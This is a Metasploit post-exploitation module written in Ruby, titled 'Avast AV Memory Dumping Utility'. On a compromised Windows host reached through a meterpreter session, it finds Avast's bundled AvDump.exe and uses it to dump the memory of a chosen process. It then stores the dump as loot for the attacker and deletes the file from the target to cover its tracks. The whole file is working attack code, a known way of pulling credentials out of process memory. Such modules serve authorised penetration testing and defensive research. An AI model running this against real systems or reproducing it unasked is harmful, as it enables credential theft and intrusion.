##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rbconfig'

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Avast AV Memory Dumping Utility',
        'Description' => %q{
          This module leverages an Avast Anti-Virus memory dump utility that is shipped
          by default with Avast Anti-Virus Home software suite.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'DLL_Cool_J' ],
        'Platform' => [ 'win'],
        'SessionTypes' => [ 'meterpreter']
      )
    )

    register_options([
      OptString.new('PID', [true, 'specify pid to dump' ]),
      OptString.new('DUMP_PATH', [true, 'specify location to write dump file to', 'C:\\Users\\Public\\tmp.dmp'])
    ])
  end

  def avdump
    avdump_paths = [
      'Avast\\AvDump.exe',
      'BreachGuard\\AvDump.exe',
      'Cleanup\\AvDump.exe',
      'Driver Updater\\AvDump.exe',
      'SecureLine VPN\\AvDump.exe'
    ]

    base = expand_path('%PROGRAMFILES%\\Avast Software\\')
    avdump_paths.each do |p|
      if file_exist?(base + p.to_s)
        return base + p.to_s
      end
    end
  end

  def run
    fail_with(Failure::NotVulnerable, 'AvDump.exe does not exist on target.') unless avdump
    print_status('AvDump.exe exists!')

    dump_path = datastore['DUMP_PATH']
    pid = datastore['PID'].to_s

    print_status("Executing Avast memory dumping utility (#{avdump}) against pid #{pid} writing to #{dump_path}")
    result = cmd_exec("#{avdump} --pid #{pid} --exception_ptr 0 --thread_id 0 --dump_file \"#{dump_path}\" --min_interval 0")

    fail_with(Failure::Unknown, "Dump file #{dump_path} was not created") unless file_exist?(dump_path)
    print_status(dump_path)
    mem_file = read_file(dump_path)
    store_loot('host.avast.memdump', 'binary/db', session, mem_file)

    print_status(result)
    rm_f(dump_path)
  end
end
